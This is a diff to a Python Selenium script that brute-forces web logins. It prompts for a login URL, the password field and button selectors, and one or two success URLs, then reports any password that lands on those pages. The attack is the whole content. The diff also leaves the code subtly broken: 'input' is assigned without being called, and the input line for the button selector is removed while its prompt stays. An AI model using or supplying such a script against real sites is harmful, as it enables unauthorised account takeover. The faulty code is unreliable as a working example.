@@ -5,15 +5,20 @@ import itertools
 # import time
 
 print('Path to your chrome driver:')
-driver_path = input()
+driver_path = input
 
 print('Url which you want brutforce:')
 login_url = input()
 
+print('Url which you want get access:')
+success_url = input()  # site where you want to fall
+
+print('Second url which you want get access:')
+user_url = input()  # Second site
+
 print('password_field_selector:')
 password_field_selector = input()
 print('login_button_selector:')
-login_button_selector = input()
 
 def brute_force_login():
     service = Service(driver_path)
@@ -32,8 +37,11 @@ def brute_force_login():
 
         # time.sleep(0.0001)  # change time if site dosen't work
 
-        if driver.current_url != login_url:
-            print(f'Login successful with password : {password}' + driver.current_url)
+        if driver.current_url == user_url:
+            print(f'Login successful with password : {password}' + ' ' + driver.current_url)
+        if driver.current_url == success_url:
+            print(f'Login successful with password : {password}' + ' ' + driver.current_url)
+
         
     driver.quit()
 
